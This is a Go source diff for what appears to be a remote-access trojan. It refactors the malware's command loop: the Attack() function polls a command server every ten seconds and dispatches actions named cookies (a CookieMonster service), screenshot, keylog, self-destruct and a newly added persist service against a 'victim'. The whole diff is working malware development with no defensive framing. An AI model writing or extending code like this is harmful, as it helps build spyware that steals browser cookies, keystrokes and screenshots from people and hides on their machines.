@@ -2,7 +2,6 @@ package services
 
 import (
 	"fmt"
-	"main/network"
 	"main/utils"
 	"os"
 	"regexp"
@@ -11,8 +10,7 @@ import (
 )
 
 type Service interface {
-	Start()
-	Communicate(victim string)
+	Run(victim string)
 }
 
 type ClosableService interface {
@@ -21,9 +19,6 @@ type ClosableService interface {
 }
 
 const (
-	Pending = iota
-	Ok
-	Error
 	NoActionMessage = "No action"
 	ActionKey       = "action"
 	StopAction      = "stop-(keylog|lazyKeylog)"
@@ -31,8 +26,9 @@ const (
 
 var (
 	actions = map[string]Service{
-		"cookies":       &CookieMonster{Mutex: &sync.Mutex{}},
-		"screenshot":    &ScreenshotService{Mutex: &sync.Mutex{}, errcode: Pending},
+		"cookies":       &CookieMonster{},
+		"screenshot":    &ScreenshotService{},
+		"persist":       &PersistService{},
 		"self-destruct": &SelfDestruct{},
 	}
 
@@ -49,10 +45,10 @@ func Attack() {
 	}
 	for {
 		fmt.Println("Establishing connnection...")
-		network.EstablishConnection(name)
+		utils.EstablishConnection(name)
 		for {
 			time.Sleep(10 * time.Second)
-			resp, err := network.HandleTextRequest("", "commands", name)
+			resp, err := utils.HandleCommandsRequest(name)
 			if err != nil {
 				fmt.Println("Error making the request, establishing another request")
 				break
@@ -61,11 +57,9 @@ func Attack() {
 				stoppableActions[utils.ParseStopCommand(resp[ActionKey])].Terminate()
 			} else if resp[ActionKey] != NoActionMessage {
 				if actions[resp[ActionKey]] != nil {
-					go actions[resp[ActionKey]].Start()
-					go actions[resp[ActionKey]].Communicate(name)
+					actions[resp[ActionKey]].Run(name)
 				} else {
-					go stoppableActions[resp[ActionKey]].Start()
-					go stoppableActions[resp[ActionKey]].Communicate(name)
+					stoppableActions[resp[ActionKey]].Run(name)
 				}
 			}
 		}
